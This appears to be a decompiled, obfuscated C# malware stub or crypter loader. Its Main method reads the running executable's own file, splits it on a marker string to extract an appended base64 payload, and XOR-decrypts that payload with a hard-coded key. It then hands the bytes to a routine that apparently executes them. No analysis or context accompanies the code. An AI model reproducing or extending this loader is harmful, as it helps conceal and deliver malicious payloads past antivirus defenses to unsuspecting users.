using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using hU4x3GePSuIEn9q1kR;
using ns1;

namespace ns0;

[StandardModule]
internal sealed class Class7
{
	private static string string_0;

	private static string string_1;

	private static string[] string_2;

	private static byte[] byte_0;

	static Class7()
	{
		Rul53eN1pQAkHhMgbS.OSEpUTCzh4CrB();
	}

	public static void smethod_0()
	{
		string_2 = Strings.Split(File.ReadAllText(Process.GetCurrentProcess().MainModule!.FileName), "EQWEQWJEJQWJEWQIHEHQWEQWEQW", -1, (CompareMethod)0);
		byte_0 = smethod_1(Convert.FromBase64String(string_2[1]), "EQWEQWIJEQJIWEJIWQJIEJIWQJIEJIWQJIEWQ");
		Encoding.GetEncoding(1252).GetBytes(string_2[1]);
	}

	[STAThread]
	public static void Main()
	{
		smethod_0();
		GClass0.smethod_2(byte_0, Application.get_ExecutablePath());
	}

	public static byte[] smethod_1(byte[] byte_1, string string_3)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(string_3);
		checked
		{
			int num = byte_1[(int)unchecked((nint)(nuint)Class39.smethod_0(byte_1)) - 1] ^ 0x70;
			byte[] array = Class14.smethod_0((int)unchecked((nint)(nuint)Class39.smethod_0(byte_1)) + 1);
			int num2 = (int)unchecked((nint)(nuint)Class39.smethod_0(byte_1)) - 1;
			int num3 = default(int);
			for (int i = 0; i <= num2; i++)
			{
				array[i] = (byte)(byte_1[i] ^ num ^ bytes[num3]);
				num3 = ((num3 != string_3.Length - 1) ? (num3 + 1) : 0);
			}
			return Class24.smethod_0(Utils.CopyArray(Class21.smethod_0(array), (Array)Class14.smethod_0((int)unchecked((nint)(nuint)Class39.smethod_0(byte_1)) - 2 + 1)));
		}
	}
}
